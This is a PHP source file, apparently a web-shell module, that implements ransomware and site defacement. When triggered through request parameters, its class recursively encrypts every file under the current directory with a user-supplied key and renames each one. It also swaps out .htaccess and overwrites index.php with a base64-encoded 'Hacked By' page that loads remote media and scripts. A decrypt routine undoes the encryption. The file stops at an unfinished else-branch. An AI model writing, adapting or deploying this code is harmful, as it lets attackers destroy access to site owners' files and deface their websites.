<?php

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if($_GET['do'] == 'ransom') {
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaencrypted")){
      rename(".htaccess", ".htaencrypted");
      if(fwrite(fopen('.htaccess', 'w'), "#./G1L4N6_ST86 ft P1L4\r\n DirectoryIndex index.php\r\n ErrorDocument 404 /index.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("index.php", base64_decode("PCFkb2N0eXBlIGh0bWw+CjxoZWFkPgo8dGl0bGU+SGFja2VkIEJ5IC4vRzFMNE42X1NUODYgZnQgUDFMNDwvdGl0bGU+CjxtZXRhIG5hbWU9InRoZW1lLWNvbG9yIiBjb250ZW50PSdibGFjaycvPgo8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9Ii4vRzFMNE42X1NUODYgZnQgUDFMNCIvPgo8bWV0YSBuYW1lPSJjb3B5cmlnaHQiIGNvbnRlbnQ9Ii4vRzFMNE42X1NUODYgZnQgUDFMNCIvPgo8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iQkFOWUFLIEJBQ09UIEtOVEwiLz4KPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IkJBTllBSyBCQUNPVCBLTlRMIElOSSIvPgo8bWV0YSBwcm9wZXJ0eT0ib2c6dGl0bGUiIGNvbnRlbnQ9Ii0gLi9HMUw0TjZfU1Q4NiBHQU5TIC0iLz4KPG1ldGEgcHJvcGVydHk9Im9nOmRlc2NyaXB0aW9uIiBjb250ZW50PSJXaGVyZSBZb3UgQXJlIFRoZXJlIFRoZXJlIEkgYW0iLz4JCjxtZXRhIHByb3BlcnR5PSJvZzppbWFnZSIgY29udGVudD0iaHR0cHM6Ly9rLnRvcDR0b3AuaW8vcF8xNjM1enMzejUwLmpwZWciLz4KPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwczovL2sudG9wNHRvcC5pby9wXzE2MzVmN2pldDAuanBlZyIvPgo8c2NyaXB0PmFsZXJ0KCdXaGVyZSBZb3UgQXJlIFRoZXJlIFRoZXJlIEkgYW0gOiknKTwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5IGJnY29sb3I9ImJsYWNrIi8+CjxjZW50ZXI+PGgzPjxmb250IGZhY2U9ImNvdXJpZXIgbmV3IiBjb2xvcj0id2hpdGUiPjwvZm9udD48L2gzPjwvY2VudGVyPgo8Y2VudGVyPjxpbWcgc3JjPSJodHRwczovL2kucGluaW1nLmNvbS9vcmlnaW5hbHMvN2QvY2UvMWUvN2RjZTFlZTBjNGFhNzM1NjkzYTE3NWQ3ODIzM2U3ZmYuZ2lmIiB3ZWlnaHQ9IjMwMCIgaGVpZ2h0PSIzMDAiLz48L2NlbnRlcj4KPGNlbnRlcj48Yj48aDM+PHNjcmlwdD4KdmFyIHRleHQ9IkhhY2tlZCBCeSAgLi9HMUw0TjZfU1Q4NiBmdCBQMUw0Igp2YXIgc3BlZWQ9NTUKaWYgKGRvY3VtZW50LmFsbHx8ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQpewpkb2N1bWVudC53cml0ZSgnPHNwYW4gaWQ9ImhpZ2hsaWdodCI+JyArIHRleHQgKyAnPC9zcGFuPicpCnZhciBzdG9yZXRleHQ9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQ/IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJoaWdobGlnaHQiKSA6IGRvY3VtZW50LmFsbC5oaWdobGlnaHQKfQplbHNlCmRvY3VtZW50LndyaXRlKHRleHQpCnZhciBoZXg9bmV3IEFycmF5KCIwMCIsIjE0IiwiMjgiLCIzQyIsIjUwIiwiNjQiLCI3OCIsIjhDIiwiQTAiLCJCNCIsIkM4IiwiREMiLCJGMCIpCnZhciByPTEKdmFyIGc9MQp2YXIgYj0xCnZhciBzZXE9MQpmdW5jdGlvbiBjaGFuZ2V0ZXh0KCl7CnJhaW5ib3c9IiMiK2hleFtyXStoZXhbZ10raGV4W2JdCnN0b3JldGV4dC5zdHlsZS5jb2xvcj1yYWluYm93Cn0KZnVuY3Rpb24gY2hhbmdlKCl7CmlmIChzZXE9PTYpewpiLS0KaWYgKGI9PTApCnNlcT0xCn0KaWYgKHNlcT09NSl7CnIrKwppZiAocj09MTIpCnNlcT02Cn0KaWYgKHNlcT09NCl7CmctLQppZiAoZz09MCkKc2VxPTUKfQppZiAoc2VxPT0zKXsKYisrCmlmIChiPT0xMikKc2VxPTQKfQppZiAoc2VxPT0yKXsKci0tCmlmIChyPT0wKQpzZXE9Mwp9CmlmIChzZXE9PTEpewpnKysKaWYgKGc9PTEyKQpzZXE9Mgp9CmNoYW5nZXRleHQoKQp9CmZ1bmN0aW9uIHN0YXJ0ZWZmZWN0KCl7CmlmIChkb2N1bWVudC5hbGx8fGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKQpmbGFzaD1zZXRJbnRlcnZhbCgiY2hhbmdlKCkiLHNwZWVkKQp9CnN0YXJ0ZWZmZWN0KCkKPC9zY3JpcHQ+CjwvYj4KPC9oMz4KPGNlbnRlcj48aDQ+PGZvbnQgZmFjZT0iY291cmllciIgY29sb3I9IndoaXRlIj7igJwgU2FkYXIgQnJvIExldmVsIEx1IHRlcmxhbHUgZWFzeSBidWF0IDwvZm9udD48L2g0PjwvY2VudGVyPgo8Y2VudGVyPjxoND48Zm9udCBmYWNlPSJjb3VyaWVyIiBjb2xvcj0id2hpdGUiPmRpYSB5YW5nIGV4cGVydCBqYWRpIGx1IGN1a3VwIHNhZGFyIGRpcmkgYWphICI8L2ZvbnQ+PC9oND48L2NlbnRlcj4KPGNlbnRlcj48YXVkaW8gYXV0b3BsYXk9ImF1dG9wbGF5IiBjb250cm9scz0iY29udHJvbHMiIHNyYz0iaHR0cHM6Ly9sLnRvcDR0b3AuaW8vbV8xNjQwdnNuY3cwLm1wMyIgdHlwZT0iYXVkaW8vbXBlZyIvPjwvY2VudGVyPgo8bWFycXVlZSBiZWhhdmlvcj0iYWx0ZXJuYXRlIiBzY3JvbGxhbW91bnQ9IjIwIiB3aWR0aD0iNTAwIiBzdHlsZT0id2lkdGg6IDUwMHB4OyI+IDxmb250IHNpemU9IjZweCIgY29sb3I9IndoaXRlIj5TaHV0IFVwIDxmb250IHNpemU9IjZweCIgY29sb3I9IndoaXRlIj5BbmQgTG9vayA8Zm9udCBzaXplPSI2cHgiIGNvbG9yPSJ3aGl0ZSI+QXQ8Zm9udCBzaXplPSI2cHgiIGNvbG9yPSJ3aGl0ZSI+IEhpbTwvZm9udD48L2ZvbnQ+PC9mb250PjwvZm9udD4gPC9tYXJxdWVlPjwvY2VudGVyPgo8Y2VudGVyPjxoMj48Zm9udCBmYWNlPSJjb3VyaWVyIiBjb2xvcj0icmVkIj5Qcml2OCBIb21lIFJvb3QgVXBsb2FkZXIgQnkgLi9HMUw0TjZfU1Q4NiBmdCBQMUw0IC0gUlVMRVoKTGludXggeG54eC5jb20gMi42LjMyLTA0MnN0YWIxMjUuNSAjMSBTTVAgVHVlIE9jdCAxNyAxMjo0ODoyMiBNU0sgMjAxNyB4ODZfNjQ8L2ZvbnQ+PC9oMj48L2NlbnRlcj4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLnJhd2dpdC5jb20vYnVuZ2ZyYW5na2kvZWZla3NhbGp1LzJhNzgwNWM3L2VmZWstc2FsanUuanMiIHR5cGU9InRleHQvamF2YXNjcmlwdCI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgo="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  Index.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){
      if( file_exists(".htaencrypted") ){
        if( unlink(".htaccess") && unlink("index.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> index.php (Default Page)<br>';
        }
        rename(".htaencrypted", ".htaccess");
      }
   }
   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"lawas.php")  && deRanSomeware::kecuali($locate,".png") && deRanSomeware::kecuali($locate,".jpg") && deRanSomeware::kecuali($locate,".JPG") && deRanSomeware::kecuali($locate,".PNG") && deRanSomeware::kecuali($locate,".gif") && deRanSomeware::kecuali($locate,".GIF") && deRanSomeware::kecuali($locate,".jpeg") && deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htaccess") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
   }
   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate."./Gilang_ST86");
        break;
        case '2':
          $locates = str_replace("./Gilang_ST86", "", $locate);
          rename($locate, $locates);
        break;
      }
   }
   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );
      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">  ~Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">  ~Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }
   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">  ~Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B"> ~ Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }
   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}
if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
